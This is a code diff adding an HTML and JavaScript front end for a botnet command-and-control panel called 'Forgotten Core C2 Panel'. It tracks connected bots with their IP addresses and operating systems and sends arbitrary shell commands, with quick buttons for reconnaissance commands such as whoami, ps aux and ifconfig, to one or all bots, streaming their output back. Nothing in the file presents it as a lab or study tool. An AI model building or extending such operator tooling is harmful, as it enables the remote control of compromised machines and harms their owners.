@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forgotten Core C2 Panel</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0a0e1a;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+        }
+        
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #0f0f1a);
+            padding: 20px;
+            border-bottom: 2px solid #00ff88;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,255,136,0.3);
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            text-shadow: 0 0 10px #00ff88;
+        }
+        
+        .header p {
+            color: #888;
+            margin-top: 5px;
+        }
+        
+        /* Stats Cards */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff88;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px rgba(0,255,136,0.5);
+        }
+        
+        .stat-number {
+            font-size: 48px;
+            font-weight: bold;
+            color: #00ff88;
+        }
+        
+        .stat-label {
+            color: #888;
+            margin-top: 10px;
+        }
+        
+        /* Main Layout */
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 20px;
+        }
+        
+        /* Bot List */
+        .bot-list {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff88;
+            border-radius: 10px;
+            padding: 20px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .bot-list h3 {
+            margin-bottom: 15px;
+            color: #00ff88;
+        }
+        
+        .bot-item {
+            background: #0a0e1a;
+            padding: 10px;
+            margin: 10px 0;
+            border-left: 3px solid #00ff88;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .bot-item:hover {
+            background: #1a1a2e;
+            transform: translateX(5px);
+        }
+        
+        .bot-item.active {
+            border-left-color: #00ff88;
+            background: #1a3a2a;
+        }
+        
+        .bot-name {
+            font-weight: bold;
+            color: #00ff88;
+        }
+        
+        .bot-ip {
+            font-size: 12px;
+            color: #888;
+        }
+        
+        .bot-status {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-online {
+            background: #00ff88;
+            box-shadow: 0 0 5px #00ff88;
+        }
+        
+        .status-offline {
+            background: #ff4444;
+        }
+        
+        /* Command Panel */
+        .command-panel {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff88;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        
+        .command-panel h3 {
+            margin-bottom: 15px;
+            color: #00ff88;
+        }
+        
+        .command-input {
+            width: 100%;
+            background: #0a0e1a;
+            border: 1px solid #00ff88;
+            color: #00ff88;
+            padding: 10px;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+        
+        .button {
+            background: #00ff88;
+            color: #0a0e1a;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .button:hover {
+            background: #00cc66;
+            transform: scale(1.05);
+        }
+        
+        .button-danger {
+            background: #ff4444;
+            color: white;
+        }
+        
+        .button-danger:hover {
+            background: #cc0000;
+        }
+        
+        /* Output Console */
+        .output-console {
+            grid-column: span 2;
+            background: #0a0e1a;
+            border: 1px solid #00ff88;
+            border-radius: 10px;
+            padding: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+        }
+        
+        .output-line {
+            color: #00ff88;
+            margin: 5px 0;
+            border-left: 2px solid #00ff88;
+            padding-left: 10px;
+        }
+        
+        /* Quick Commands */
+        .quick-commands {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 15px 0;
+        }
+        
+        .quick-btn {
+            background: #1a1a2e;
+            border: 1px solid #00ff88;
+            padding: 5px 10px;
+            font-size: 12px;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #0a0e1a;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ff88;
+            border-radius: 5px;
+        }
+        
+        @keyframes glow {
+            0% { text-shadow: 0 0 5px #00ff88; }
+            100% { text-shadow: 0 0 20px #00ff88; }
+        }
+        
+        .glow {
+            animation: glow 1s ease-in-out infinite alternate;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔮 FORGOTTEN CORE C2 PANEL</h1>
+        <p>Command & Control Center | Real-time Bot Management</p>
+    </div>
+    
+    <div class="stats-container">
+        <div class="stat-card">
+            <div class="stat-number" id="totalBots">0</div>
+            <div class="stat-label">Total Bots</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="activeBots">0</div>
+            <div class="stat-label">Active Bots</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="offlineBots">0</div>
+            <div class="stat-label">Offline Bots</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="commandsSent">0</div>
+            <div class="stat-label">Commands Sent</div>
+        </div>
+    </div>
+    
+    <div class="main-container">
+        <div class="bot-list">
+            <h3>📡 Connected Bots</h3>
+            <div id="botList"></div>
+        </div>
+        
+        <div class="command-panel">
+            <h3>⚡ Command Center</h3>
+            <div class="quick-commands">
+                <button class="button quick-btn" onclick="quickCommand('whoami')">whoami</button>
+                <button class="button quick-btn" onclick="quickCommand('pwd')">pwd</button>
+                <button class="button quick-btn" onclick="quickCommand('ls -la')">ls -la</button>
+                <button class="button quick-btn" onclick="quickCommand('ifconfig')">ifconfig</button>
+                <button class="button quick-btn" onclick="quickCommand('ps aux')">ps aux</button>
+                <button class="button quick-btn" onclick="quickCommand('uname -a')">uname -a</button>
+            </div>
+            <select id="botSelect" class="command-input">
+                <option value="all">All Bots</option>
+            </select>
+            <input type="text" id="commandInput" class="command-input" placeholder="Enter command..." onkeypress="if(event.keyCode==13) sendCommand()">
+            <button class="button" onclick="sendCommand()">🚀 Send Command</button>
+            <button class="button button-danger" onclick="clearConsole()">🗑️ Clear Console</button>
+        </div>
+        
+        <div class="output-console">
+            <h3>📝 Console Output</h3>
+            <div id="consoleOutput"></div>
+        </div>
+    </div>
+    
+    <script>
+        let socket = io();
+        let commandsCount = 0;
+        
+        socket.on('connect', function() {
+            addOutput('[*] Connected to C2 Server');
+        });
+        
+        socket.on('bot_update', function(data) {
+            addOutput(`[+] Bot ${data.bot_id} ${data.action}`);
+            loadBots();
+            loadStats();
+        });
+        
+        socket.on('bot_output', function(data) {
+            addOutput(`[${data.bot_id}] $ ${data.output}`);
+        });
+        
+        function loadBots() {
+            $.get('/api/bots', function(data) {
+                let bots = data.bots;
+                let botList = '';
+                let botSelect = '<option value="all">All Bots</option>';
+                
+                for(let id in bots) {
+                    let bot = bots[id];
+                    let statusClass = bot.status === 'active' ? 'status-online' : 'status-offline';
+                    botList += `
+                        <div class="bot-item" onclick="selectBot('${id}')">
+                            <div class="bot-name">
+                                <span class="bot-status ${statusClass}"></span>
+                                ${id}
+                            </div>
+                            <div class="bot-ip">IP: ${bot.ip} | OS: ${bot.os}</div>
+                            <div class="bot-ip">Last: ${bot.last_seen}</div>
+                        </div>
+                    `;
+                    botSelect += `<option value="${id}">${id}</option>`;
+                }
+                
+                $('#botList').html(botList || '<p>No bots connected</p>');
+                $('#botSelect').html(botSelect);
+            });
+        }
+        
+        function loadStats() {
+            $.get('/api/stats', function(data) {
+                $('#totalBots').text(data.total);
+                $('#activeBots').text(data.active);
+                $('#offlineBots').text(data.offline);
+            });
+        }
+        
+        function sendCommand() {
+            let botId = $('#botSelect').val();
+            let command = $('#commandInput').val();
+            
+            if(!command) return;
+            
+            $.post('/api/send_command', JSON.stringify({
+                bot_id: botId,
+                command: command
+            }), function(data) {
+                commandsCount++;
+                $('#commandsSent').text(commandsCount);
+                addOutput(`[→] Command sent to ${botId}: ${command}`);
+                $('#commandInput').val('');
+            }).fail(function() {
+                addOutput('[!] Failed to send command');
+            });
+        }
+        
+        function quickCommand(cmd) {
+            $('#commandInput').val(cmd);
+            sendCommand();
+        }
+        
+        function selectBot(botId) {
+            $('#botSelect').val(botId);
+            addOutput(`[*] Selected bot: ${botId}`);
+        }
+        
+        function clearConsole() {
+            $('#consoleOutput').html('');
+        }
+        
+        function addOutput(text) {
+            let timestamp = new Date().toLocaleTimeString();
+            $('#consoleOutput').prepend(`<div class="output-line">[${timestamp}] ${escapeHtml(text)}</div>`);
+            
+            // Limit to 100 lines
+            if($('#consoleOutput .output-line').length > 100) {
+                $('#consoleOutput .output-line:last').remove();
+            }
+        }
+        
+        function escapeHtml(text) {
+            return text.replace(/[&<>]/g, function(m) {
+                if(m === '&') return '&amp;';
+                if(m === '<') return '&lt;';
+                if(m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        // Auto refresh every 5 seconds
+        setInterval(function() {
+            loadBots();
+            loadStats();
+        }, 5000);
+        
+        // Initial load
+        loadBots();
+        loadStats();
+    </script>
+</body>
+</html>
